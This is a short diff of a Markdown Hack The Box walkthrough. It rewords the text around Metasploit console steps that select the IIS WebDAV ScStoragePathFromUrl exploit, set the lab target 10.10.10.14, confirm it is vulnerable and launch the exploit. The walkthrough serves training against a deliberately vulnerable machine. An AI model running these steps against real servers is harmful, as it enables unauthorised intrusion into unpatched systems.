@@ -254,19 +254,19 @@ Exploit target:
    0   Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
-The only mandatory option that has to be set is __RHOSTS__, and corresponds to the target (victim) host. So let's set it to the IP address of the HTB machine:
+The only mandatory option that has to be set is __RHOSTS__, and corresponds to the target (victim) host. So let's set it to the IP address of the vulnerable-on-purpose HTB machine:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
 RHOSTS => 10.10.10.14
 ```
 
-Another really interesting feature of Metasploit modules is that some of them they have a _check_ function to verify if the target host is vulnerable:
+Another really interesting feature of Metasploit modules is that some of them they have a _check_ function to verify if the target host is vulnerable to the selected exploit:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
 [+] 10.10.10.14:80 - The target is vulnerable.
 ```
 
-As it is vulnerable, let's proceed to run the exploit:
+As it is vulnerable, let's proceed to run the exploit to gain access to the victim:
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 
